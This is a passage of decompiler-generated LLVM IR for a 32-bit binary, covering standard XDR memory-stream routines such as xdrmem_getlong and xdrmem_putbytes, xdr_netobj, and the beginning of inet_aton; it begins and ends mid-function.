  br i1 %v1_8057417, label %dec_label_pc_80574a5, label %dec_label_pc_805741f

dec_label_pc_805741f:                             ; preds = %entry
  %v0_805741f = load i32, i32* %esi.global-to-local, align 4
  %v1_805741f = inttoptr i32 %v0_805741f to i32*
  %v2_805741f = load i32, i32* %v1_805741f, align 4
  store i32 %v2_805741f, i32* @esi, align 4
  %tmp = icmp ugt i32 %v2_805741f, %arg4
  %v0_805742c.pre = load i32, i32* @edi, align 4
  %v1_805742c.phi.trans.insert = inttoptr i32 %v0_805742c.pre to i32*
  %v2_805742c.pre = load i32, i32* %v1_805742c.phi.trans.insert, align 4
  br i1 %tmp, label %dec_label_pc_8057427, label %dec_label_pc_805742c

dec_label_pc_8057427:                             ; preds = %dec_label_pc_805741f
  %v11_8057427 = icmp eq i32 %v2_805742c.pre, 2
  %v1_805742a = icmp eq i1 %v11_8057427, false
  br i1 %v1_805742a, label %dec_label_pc_80574a5, label %dec_label_pc_805742c

dec_label_pc_805742c:                             ; preds = %dec_label_pc_805741f, %dec_label_pc_8057427
  store i32 %v2_805742c.pre, i32* %eax.global-to-local, align 4
  %v9_805742e = icmp eq i32 %v2_805742c.pre, 1
  br i1 %v9_805742e, label %dec_label_pc_805743c, label %dec_label_pc_8057433

dec_label_pc_8057433:                             ; preds = %dec_label_pc_805742c
  %v5_805742e = icmp eq i32 %v2_805742c.pre, 0
  br i1 %v5_805742e, label %dec_label_pc_805746f, label %dec_label_pc_8057435

dec_label_pc_8057435:                             ; preds = %dec_label_pc_8057433
  %v9_8057435 = icmp eq i32 %v2_805742c.pre, 2
  %v1_8057438 = icmp eq i1 %v9_8057435, false
  br i1 %v1_8057438, label %dec_label_pc_80574a5, label %dec_label_pc_8057487

dec_label_pc_805743c:                             ; preds = %dec_label_pc_805742c
  %v1_805743c = icmp eq i32 %v2_805741f, 0
  br i1 %v1_805743c, label %dec_label_pc_80574a9, label %dec_label_pc_8057440

dec_label_pc_8057440:                             ; preds = %dec_label_pc_805743c
  %v0_8057440 = load i32, i32* @ebx, align 4
  %v1_8057440 = icmp eq i32 %v0_8057440, 0
  %v1_8057442 = icmp eq i1 %v1_8057440, false
  br i1 %v1_8057442, label %dec_label_pc_805746f, label %dec_label_pc_8057444

dec_label_pc_8057444:                             ; preds = %dec_label_pc_8057440
  %v2_8057448 = call i32 @malloc(i32 %v2_805741f)
  store i32 %v2_8057448, i32* %eax.global-to-local, align 4
  %v1_8057450 = icmp eq i32 %v2_8057448, 0
  store i32 %v2_8057448, i32* @ebx, align 4
  %v1_8057454 = load i32, i32* @ebp, align 4
  %v2_8057454 = inttoptr i32 %v1_8057454 to i32*
  store i32 %v2_8057448, i32* %v2_8057454, align 4
  %v1_8057457 = icmp eq i1 %v1_8057450, false
  br i1 %v1_8057457, label %dec_label_pc_8057444.dec_label_pc_805746f_crit_edge, label %dec_label_pc_8057459

dec_label_pc_8057444.dec_label_pc_805746f_crit_edge: ; preds = %dec_label_pc_8057444
  %v0_8057477.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805746f

dec_label_pc_8057459:                             ; preds = %dec_label_pc_8057444
  %v0_805745b = load i32, i32* @global_var_8062b70, align 16
  %v3_8057466 = call i32 @__GI_fputs(i32 ptrtoint ([26 x i8]* @global_var_805cf43.312 to i32), i32 %v0_805745b)
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80574a0

dec_label_pc_805746f:                             ; preds = %dec_label_pc_8057444.dec_label_pc_805746f_crit_edge, %dec_label_pc_8057440, %dec_label_pc_8057433
  %v0_8057477 = phi i32 [ %v0_8057477.pre, %dec_label_pc_8057444.dec_label_pc_805746f_crit_edge ], [ %v0_805742c.pre, %dec_label_pc_8057440 ], [ %v0_805742c.pre, %dec_label_pc_8057433 ]
  %v0_8057473 = load i32, i32* @ebx, align 4
  %v2_805747e = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805747e, i32* @ebx, align 4
  store i32 %v0_80573f1, i32* @esi, align 4
  store i32 %v0_80573f0, i32* @edi, align 4
  store i32 %v0_80573ef, i32* @ebp, align 4
  %v3_8057482 = call i32 @xdr_opaque(i32 %v0_8057477, i32 %v0_8057473, i32 %v2_805741f)
  store i32 %v3_8057482, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057487

dec_label_pc_8057487:                             ; preds = %dec_label_pc_8057435, %dec_label_pc_805746f
  %v0_8057487 = load i32, i32* @ebx, align 4
  %v1_8057487 = icmp eq i32 %v0_8057487, 0
  br i1 %v1_8057487, label %dec_label_pc_80574a9, label %dec_label_pc_805748b

dec_label_pc_805748b:                             ; preds = %dec_label_pc_8057487
  %v2_805748f = call i32 @free(i32 %v0_8057487)
  store i32 1, i32* %eax.global-to-local, align 4
  %v0_8057499 = load i32, i32* @ebp, align 4
  %v1_8057499 = inttoptr i32 %v0_8057499 to i32*
  store i32 0, i32* %v1_8057499, align 4
  %v0_80574b5.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80574a0

dec_label_pc_80574a0:                             ; preds = %dec_label_pc_8057459, %dec_label_pc_805748b
  %v0_80574b5.pre = phi i32 [ 0, %dec_label_pc_8057459 ], [ %v0_80574b5.pre.pre, %dec_label_pc_805748b ]
  br label %dec_label_pc_80574ae

dec_label_pc_80574a5:                             ; preds = %dec_label_pc_8057435, %dec_label_pc_8057427, %entry
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80574ae

dec_label_pc_80574a9:                             ; preds = %dec_label_pc_8057487, %dec_label_pc_805743c
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80574ae

dec_label_pc_80574ae:                             ; preds = %dec_label_pc_80574a5, %dec_label_pc_80574a0, %dec_label_pc_80574a9
  %v0_80574b5 = phi i32 [ 0, %dec_label_pc_80574a5 ], [ %v0_80574b5.pre, %dec_label_pc_80574a0 ], [ 1, %dec_label_pc_80574a9 ]
  store i32 %v0_80573f1, i32* %esi.global-to-local, align 4
  store i32 %v0_80573f0, i32* @edi, align 4
  store i32 %v0_80573ef, i32* @ebp, align 4
  ret i32 %v0_80574b5

; uselistorder directives
  uselistorder i32 %v2_8057448, { 2, 1, 0, 3 }
  uselistorder i32 %v2_805742c.pre, { 0, 3, 1, 4, 2 }
  uselistorder i32 %v0_805742c.pre, { 1, 0, 2 }
  uselistorder i32 %v2_805741f, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_80573f1, { 1, 0 }
  uselistorder i32 %v0_80573f0, { 1, 0 }
  uselistorder i32 %v0_80573ef, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder i32 (i32, i32, i32)* @xdr_opaque, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80574ae, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80574a0, { 1, 0 }
  uselistorder label %dec_label_pc_8057487, { 1, 0 }
  uselistorder label %dec_label_pc_805742c, { 1, 0 }
}

define i32 @xdr_netobj(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_80574c3 = add i32 %arg2, 4
  %v4_80574cb = inttoptr i32 %arg1 to i32*
  %v5_80574cb = call i32 @xdr_bytes(i32* %v4_80574cb, i32 %v1_80574c3, i32 %arg2, i32 1024)
  ret i32 %v5_80574cb
}

define i32 @__GI_xdrmem_create(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  store i32 %tmp3, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg4, i32* %arg1, align 4
  %v1_80574e2 = add i32 %tmp3, 4
  %v2_80574e2 = inttoptr i32 %v1_80574e2 to i32*
  store i32 ptrtoint (i32* @global_var_805cf80.313 to i32), i32* %v2_80574e2, align 4
  %v0_80574e9 = load i32, i32* @ecx, align 4
  %v1_80574e9 = load i32, i32* %edx.global-to-local, align 4
  %v2_80574e9 = add i32 %v1_80574e9, 16
  %v3_80574e9 = inttoptr i32 %v2_80574e9 to i32*
  store i32 %v0_80574e9, i32* %v3_80574e9, align 4
  %v0_80574ec = load i32, i32* @ecx, align 4
  %v1_80574ec = load i32, i32* %edx.global-to-local, align 4
  %v2_80574ec = add i32 %v1_80574ec, 12
  %v3_80574ec = inttoptr i32 %v2_80574ec to i32*
  store i32 %v0_80574ec, i32* %v3_80574ec, align 4
  %v1_80574f3 = load i32, i32* %edx.global-to-local, align 4
  %v2_80574f3 = add i32 %v1_80574f3, 20
  %v3_80574f3 = inttoptr i32 %v2_80574f3 to i32*
  store i32 %arg3, i32* %v3_80574f3, align 4
  ret i32 %arg3

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
}

define i32 @xdrmem_destroy() local_unnamed_addr {
entry:
  %v0_80574f7 = load i32, i32* @eax, align 4
  ret i32 %v0_80574f7
}

define i32 @xdrmem_getpos(i32 %arg1) local_unnamed_addr {
entry:
  %v1_80574fc = add i32 %arg1, 12
  %v2_80574fc = inttoptr i32 %v1_80574fc to i32*
  %v3_80574fc = load i32, i32* %v2_80574fc, align 4
  %v2_80574ff = add i32 %arg1, 16
  %v3_80574ff = inttoptr i32 %v2_80574ff to i32*
  %v4_80574ff = load i32, i32* %v3_80574ff, align 4
  %v5_80574ff = sub i32 %v3_80574fc, %v4_80574ff
  ret i32 %v5_80574ff
}

define i32 @xdrmem_setpos(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8057503 = load i32, i32* @ebx, align 4
  store i32 %v0_8057503, i32* %stack_var_-4, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_805750e = add i32 %arg1, 20
  %v2_805750e = inttoptr i32 %v1_805750e to i32*
  %v3_805750e = load i32, i32* %v2_805750e, align 4
  store i32 %v3_805750e, i32* %eax.global-to-local, align 4
  %v2_8057511 = add i32 %arg1, 16
  %v3_8057511 = inttoptr i32 %v2_8057511 to i32*
  %v4_8057511 = load i32, i32* %v3_8057511, align 4
  %v5_8057511 = add i32 %v4_8057511, %arg2
  %v2_8057514 = add i32 %arg1, 12
  %v3_8057514 = inttoptr i32 %v2_8057514 to i32*
  %v4_8057514 = load i32, i32* %v3_8057514, align 4
  %v5_8057514 = add i32 %v4_8057514, %v3_805750e
  store i32 %v5_8057514, i32* %eax.global-to-local, align 4
  %v8_8057519 = icmp slt i32 %v5_8057514, %v5_8057511
  br i1 %v8_8057519, label %dec_label_pc_8057525, label %dec_label_pc_805751b

dec_label_pc_805751b:                             ; preds = %entry
  %v2_805751b = sub i32 %v5_8057514, %v5_8057511
  store i32 %v2_805751b, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  store i32 %v5_8057511, i32* %v3_8057514, align 4
  %v0_8057522 = load i32, i32* %eax.global-to-local, align 4
  %v1_8057522 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8057522 = add i32 %v1_8057522, 20
  %v3_8057522 = inttoptr i32 %v2_8057522 to i32*
  store i32 %v0_8057522, i32* %v3_8057522, align 4
  %v0_8057525.pre = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057527.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8057525

dec_label_pc_8057525:                             ; preds = %entry, %dec_label_pc_805751b
  %v2_8057527 = phi i32 [ %v0_8057503, %entry ], [ %v2_8057527.pre, %dec_label_pc_805751b ]
  %v0_8057525 = phi i32 [ 0, %entry ], [ %v0_8057525.pre, %dec_label_pc_805751b ]
  store i32 %v0_8057525, i32* %eax.global-to-local, align 4
  store i32 %v2_8057527, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8057525

; uselistorder directives
  uselistorder i32 %v0_8057525, { 1, 0 }
  uselistorder i32 %v5_8057514, { 1, 0, 2 }
  uselistorder i32 %v5_8057511, { 1, 2, 0 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8057525, { 1, 0 }
}

define i32 @xdrmem_inline(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8057529 = load i32, i32* @ebx, align 4
  store i32 %v0_8057529, i32* %stack_var_-4, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v1_8057534 = add i32 %arg1, 20
  %v2_8057534 = inttoptr i32 %v1_8057534 to i32*
  %v3_8057534 = load i32, i32* %v2_8057534, align 4
  %v7_8057537 = icmp ult i32 %v3_8057534, %arg2
  br i1 %v7_8057537, label %dec_label_pc_8057549, label %dec_label_pc_805753b

dec_label_pc_805753b:                             ; preds = %entry
  %v2_8057537 = sub i32 %v3_8057534, %arg2
  %v1_805753b = add i32 %arg1, 12
  %v2_805753b = inttoptr i32 %v1_805753b to i32*
  %v3_805753b = load i32, i32* %v2_805753b, align 4
  store i32 %v3_805753b, i32* %edx.global-to-local, align 4
  store i32 %v2_8057537, i32* %v2_8057534, align 4
  %v0_8057543 = load i32, i32* %edx.global-to-local, align 4
  %v1_8057543 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057543 = add i32 %v1_8057543, %v0_8057543
  %v1_8057546 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8057546 = add i32 %v1_8057546, 12
  %v3_8057546 = inttoptr i32 %v2_8057546 to i32*
  store i32 %v2_8057543, i32* %v3_8057546, align 4
  %v2_8057549.pre = load i32, i32* %stack_var_-4, align 4
  %v0_805754a.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8057549

dec_label_pc_8057549:                             ; preds = %entry, %dec_label_pc_805753b
  %v0_805754a = phi i32 [ 0, %entry ], [ %v0_805754a.pre, %dec_label_pc_805753b ]
  %v2_8057549 = phi i32 [ %v0_8057529, %entry ], [ %v2_8057549.pre, %dec_label_pc_805753b ]
  store i32 %v2_8057549, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805754a

; uselistorder directives
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8057549, { 1, 0 }
}

define i32 @xdrmem_putint32(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8057553 = add i32 %arg1, 20
  %v2_8057553 = inttoptr i32 %v1_8057553 to i32*
  %v3_8057553 = load i32, i32* %v2_8057553, align 4
  %tmp = icmp ult i32 %v3_8057553, 4
  br i1 %tmp, label %dec_label_pc_8057577, label %dec_label_pc_805755b

dec_label_pc_805755b:                             ; preds = %entry
  %v1_805755b = add i32 %v3_8057553, -4
  %v1_805755e = add i32 %arg1, 12
  %v2_805755e = inttoptr i32 %v1_805755e to i32*
  %v3_805755e = load i32, i32* %v2_805755e, align 4
  store i32 %v3_805755e, i32* %edx.global-to-local, align 4
  store i32 %v1_805755b, i32* %v2_8057553, align 4
  %v2_8057568 = load i32, i32* %arg2, align 4
  %v1_805756a = call i32 @llvm.bswap.i32(i32 %v2_8057568)
  %v1_805756c = load i32, i32* %edx.global-to-local, align 4
  %v2_805756c = inttoptr i32 %v1_805756c to i32*
  store i32 %v1_805756a, i32* %v2_805756c, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_8057573 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8057573 = add i32 %v0_8057573, 12
  %v2_8057573 = inttoptr i32 %v1_8057573 to i32*
  %v3_8057573 = load i32, i32* %v2_8057573, align 4
  %v4_8057573 = add i32 %v3_8057573, 4
  store i32 %v4_8057573, i32* %v2_8057573, align 4
  %v0_8057577.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8057577

dec_label_pc_8057577:                             ; preds = %entry, %dec_label_pc_805755b
  %v0_8057577 = phi i32 [ 0, %entry ], [ %v0_8057577.pre, %dec_label_pc_805755b ]
  ret i32 %v0_8057577

; uselistorder directives
  uselistorder i32 %v3_8057553, { 1, 0 }
  uselistorder label %dec_label_pc_8057577, { 1, 0 }
}

define i32 @xdrmem_getint32(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8057580 = add i32 %arg1, 20
  %v2_8057580 = inttoptr i32 %v1_8057580 to i32*
  %v3_8057580 = load i32, i32* %v2_8057580, align 4
  %tmp = icmp ult i32 %v3_8057580, 4
  br i1 %tmp, label %dec_label_pc_80575a4, label %dec_label_pc_8057588

dec_label_pc_8057588:                             ; preds = %entry
  %tmp3 = ptrtoint i32* %arg2 to i32
  %v1_8057588 = add i32 %v3_8057580, -4
  store i32 %v1_8057588, i32* %v2_8057580, align 4
  %v0_805758e = load i32, i32* %ecx.global-to-local, align 4
  %v1_805758e = add i32 %v0_805758e, 12
  %v2_805758e = inttoptr i32 %v1_805758e to i32*
  %v3_805758e = load i32, i32* %v2_805758e, align 4
  store i32 %tmp3, i32* %edx.global-to-local, align 4
  %v1_8057595 = inttoptr i32 %v3_805758e to i32*
  %v2_8057595 = load i32, i32* %v1_8057595, align 4
  %v1_8057597 = call i32 @llvm.bswap.i32(i32 %v2_8057595)
  store i32 %v1_8057597, i32* %arg2, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_80575a0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80575a0 = add i32 %v0_80575a0, 12
  %v2_80575a0 = inttoptr i32 %v1_80575a0 to i32*
  %v3_80575a0 = load i32, i32* %v2_80575a0, align 4
  %v4_80575a0 = add i32 %v3_80575a0, 4
  store i32 %v4_80575a0, i32* %v2_80575a0, align 4
  %v0_80575a4.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80575a4

dec_label_pc_80575a4:                             ; preds = %entry, %dec_label_pc_8057588
  %v0_80575a4 = phi i32 [ 0, %entry ], [ %v0_80575a4.pre, %dec_label_pc_8057588 ]
  ret i32 %v0_80575a4

; uselistorder directives
  uselistorder i32 %v3_8057580, { 1, 0 }
  uselistorder label %dec_label_pc_80575a4, { 1, 0 }
}

define i32 @xdrmem_putlong(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_80575ad = add i32 %arg1, 20
  %v2_80575ad = inttoptr i32 %v1_80575ad to i32*
  %v3_80575ad = load i32, i32* %v2_80575ad, align 4
  %tmp = icmp ult i32 %v3_80575ad, 4
  br i1 %tmp, label %dec_label_pc_80575d1, label %dec_label_pc_80575b5

dec_label_pc_80575b5:                             ; preds = %entry
  %v1_80575b5 = add i32 %v3_80575ad, -4
  %v1_80575b8 = add i32 %arg1, 12
  %v2_80575b8 = inttoptr i32 %v1_80575b8 to i32*
  %v3_80575b8 = load i32, i32* %v2_80575b8, align 4
  store i32 %v3_80575b8, i32* %edx.global-to-local, align 4
  store i32 %v1_80575b5, i32* %v2_80575ad, align 4
  %v2_80575c2 = load i32, i32* %arg2, align 4
  %v1_80575c4 = call i32 @llvm.bswap.i32(i32 %v2_80575c2)
  %v1_80575c6 = load i32, i32* %edx.global-to-local, align 4
  %v2_80575c6 = inttoptr i32 %v1_80575c6 to i32*
  store i32 %v1_80575c4, i32* %v2_80575c6, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_80575cd = load i32, i32* %ecx.global-to-local, align 4
  %v1_80575cd = add i32 %v0_80575cd, 12
  %v2_80575cd = inttoptr i32 %v1_80575cd to i32*
  %v3_80575cd = load i32, i32* %v2_80575cd, align 4
  %v4_80575cd = add i32 %v3_80575cd, 4
  store i32 %v4_80575cd, i32* %v2_80575cd, align 4
  %v0_80575d1.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80575d1

dec_label_pc_80575d1:                             ; preds = %entry, %dec_label_pc_80575b5
  %v0_80575d1 = phi i32 [ 0, %entry ], [ %v0_80575d1.pre, %dec_label_pc_80575b5 ]
  ret i32 %v0_80575d1

; uselistorder directives
  uselistorder i32 %v3_80575ad, { 1, 0 }
  uselistorder label %dec_label_pc_80575d1, { 1, 0 }
}

define i32 @xdrmem_getlong(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_80575da = add i32 %arg1, 20
  %v2_80575da = inttoptr i32 %v1_80575da to i32*
  %v3_80575da = load i32, i32* %v2_80575da, align 4
  %tmp = icmp ult i32 %v3_80575da, 4
  br i1 %tmp, label %dec_label_pc_80575fe, label %dec_label_pc_80575e2

dec_label_pc_80575e2:                             ; preds = %entry
  %tmp3 = ptrtoint i32* %arg2 to i32
  %v1_80575e2 = add i32 %v3_80575da, -4
  store i32 %v1_80575e2, i32* %v2_80575da, align 4
  %v0_80575e8 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80575e8 = add i32 %v0_80575e8, 12
  %v2_80575e8 = inttoptr i32 %v1_80575e8 to i32*
  %v3_80575e8 = load i32, i32* %v2_80575e8, align 4
  store i32 %tmp3, i32* %edx.global-to-local, align 4
  %v1_80575ef = inttoptr i32 %v3_80575e8 to i32*
  %v2_80575ef = load i32, i32* %v1_80575ef, align 4
  %v1_80575f1 = call i32 @llvm.bswap.i32(i32 %v2_80575ef)
  store i32 %v1_80575f1, i32* %arg2, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_80575fa = load i32, i32* %ecx.global-to-local, align 4
  %v1_80575fa = add i32 %v0_80575fa, 12
  %v2_80575fa = inttoptr i32 %v1_80575fa to i32*
  %v3_80575fa = load i32, i32* %v2_80575fa, align 4
  %v4_80575fa = add i32 %v3_80575fa, 4
  store i32 %v4_80575fa, i32* %v2_80575fa, align 4
  %v0_80575fe.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80575fe

dec_label_pc_80575fe:                             ; preds = %entry, %dec_label_pc_80575e2
  %v0_80575fe = phi i32 [ 0, %entry ], [ %v0_80575fe.pre, %dec_label_pc_80575e2 ]
  ret i32 %v0_80575fe

; uselistorder directives
  uselistorder i32 %v3_80575da, { 1, 0 }
  uselistorder label %dec_label_pc_80575fe, { 1, 0 }
}

define i32 @xdrmem_putbytes(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8057610 = add i32 %arg1, 20
  %v2_8057610 = inttoptr i32 %v1_8057610 to i32*
  %v3_8057610 = load i32, i32* %v2_8057610, align 4
  %v7_8057613 = icmp ult i32 %v3_8057610, %arg3
  br i1 %v7_8057613, label %dec_label_pc_8057635, label %dec_label_pc_8057617

dec_label_pc_8057617:                             ; preds = %entry
  %v2_8057613 = sub i32 %v3_8057610, %arg3
  store i32 %v2_8057613, i32* %v2_8057610, align 4
  %v0_805761d = load i32, i32* @esi, align 4
  %v0_8057622 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057622 = add i32 %v0_8057622, 12
  %v2_8057622 = inttoptr i32 %v1_8057622 to i32*
  %v3_8057622 = load i32, i32* %v2_8057622, align 4
  %v3_8057625 = inttoptr i32 %v3_8057622 to i16*
  %v4_8057625 = call i32 @memcpy(i16* %v3_8057625, i32 %arg2, i32 %v0_805761d)
  store i32 1, i32* %eax.global-to-local, align 4
  %v0_8057632 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057632 = add i32 %v0_8057632, 12
  %v2_8057632 = inttoptr i32 %v1_8057632 to i32*
  %v3_8057632 = load i32, i32* %v2_8057632, align 4
  %v4_8057632 = load i32, i32* @esi, align 4
  %v5_8057632 = add i32 %v4_8057632, %v3_8057632
  store i32 %v5_8057632, i32* %v2_8057632, align 4
  %v0_8057638.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057635

dec_label_pc_8057635:                             ; preds = %entry, %dec_label_pc_8057617
  %v0_8057638 = phi i32 [ 0, %entry ], [ %v0_8057638.pre, %dec_label_pc_8057617 ]
  ret i32 %v0_8057638

; uselistorder directives
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8057635, { 1, 0 }
}

define i32 @xdrmem_getbytes(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8057648 = add i32 %arg1, 20
  %v2_8057648 = inttoptr i32 %v1_8057648 to i32*
  %v3_8057648 = load i32, i32* %v2_8057648, align 4
  %v7_805764b = icmp ult i32 %v3_8057648, %arg3
  br i1 %v7_805764b, label %dec_label_pc_805766d, label %dec_label_pc_805764f

dec_label_pc_805764f:                             ; preds = %entry
  %v2_805764b = sub i32 %v3_8057648, %arg3
  store i32 %v2_805764b, i32* %v2_8057648, align 4
  %v0_8057655 = load i32, i32* @esi, align 4
  %v0_8057656 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057656 = add i32 %v0_8057656, 12
  %v2_8057656 = inttoptr i32 %v1_8057656 to i32*
  %v3_8057656 = load i32, i32* %v2_8057656, align 4
  %v3_805765d = inttoptr i32 %arg2 to i16*
  %v4_805765d = call i32 @memcpy(i16* %v3_805765d, i32 %v3_8057656, i32 %v0_8057655)
  store i32 1, i32* %eax.global-to-local, align 4
  %v0_805766a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805766a = add i32 %v0_805766a, 12
  %v2_805766a = inttoptr i32 %v1_805766a to i32*
  %v3_805766a = load i32, i32* %v2_805766a, align 4
  %v4_805766a = load i32, i32* @esi, align 4
  %v5_805766a = add i32 %v4_805766a, %v3_805766a
  store i32 %v5_805766a, i32* %v2_805766a, align 4
  %v0_8057670.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805766d

dec_label_pc_805766d:                             ; preds = %entry, %dec_label_pc_805764f
  %v0_8057670 = phi i32 [ 0, %entry ], [ %v0_8057670.pre, %dec_label_pc_805764f ]
  ret i32 %v0_8057670

; uselistorder directives
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805766d, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_805767b = ptrtoint i8* %arg1 to i32
  store i32 %v4_805767b, i32* @ecx, align 4
  %v1_805767f = icmp eq i8* %arg1, null
  br i1 %v1_805767f, label %dec_label_pc_8057700, label %dec_label_pc_8057683

dec_label_pc_8057683:                             ; preds = %entry
  %v0_805768e.pre = load i32, i32* @global_var_8062dc0, align 64
  br label %dec_label_pc_805768e

dec_label_pc_805768e:                             ; preds = %dec_label_pc_8057683, %dec_label_pc_80576d7
  %v2_80576d734 = phi i32 [ 1, %dec_label_pc_8057683 ], [ %v3_80576d7, %dec_label_pc_80576d7 ]
  %v0_805769433 = phi i32 [ %v4_805767b, %dec_label_pc_8057683 ], [ %v0_80576943, %dec_label_pc_80576d7 ]
  %v0_80576f532 = phi i32 [ 0, %dec_label_pc_8057683 ], [ %v2_80576dd, %dec_label_pc_80576d7 ]
  %v1_8057694 = inttoptr i32 %v0_805769433 to i8*
  %v2_8057694 = load i8, i8* %v1_8057694, align 1
  %v3_8057694 = sext i8 %v2_8057694 to i32
  %v2_8057697 = mul nsw i32 %v3_8057694, 2
  %v3_8057697 = add i32 %v2_8057697, %v0_805768e.pre
  %v4_8057697 = inttoptr i32 %v3_8057697 to i8*
  %v5_8057697 = load i8, i8* %v4_8057697, align 1
  %v6_8057697 = and i8 %v5_8057697, 8
  %v7_8057697 = icmp eq i8 %v6_8057697, 0
  br i1 %v7_8057697, label %dec_label_pc_8057700, label %dec_label_pc_805769e

dec_label_pc_805769e:                             ; preds = %dec_label_pc_805768e
  %v4_80576b2.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80576b2

dec_label_pc_80576a2:                             ; preds = %dec_label_pc_80576b2
  %v3_80576a2 = mul i32 %v1_80576a2, 10
  %v2_80576a5 = add i32 %v3_80576a2, -48
  %v3_80576a5 = add i32 %v2_80576a5, %v2_80576b4
  %v1_80576a9 = add i32 %v3_80576a5, -255
  %v6_80576a9 = sub i32 254, %v3_80576a5
  %v7_80576a9 = and i32 %v6_80576a9, %v3_80576a5
  %v8_80576a9 = icmp slt i32 %v7_80576a9, 0
  %v9_80576a9 = icmp eq i32 %v1_80576a9, 0
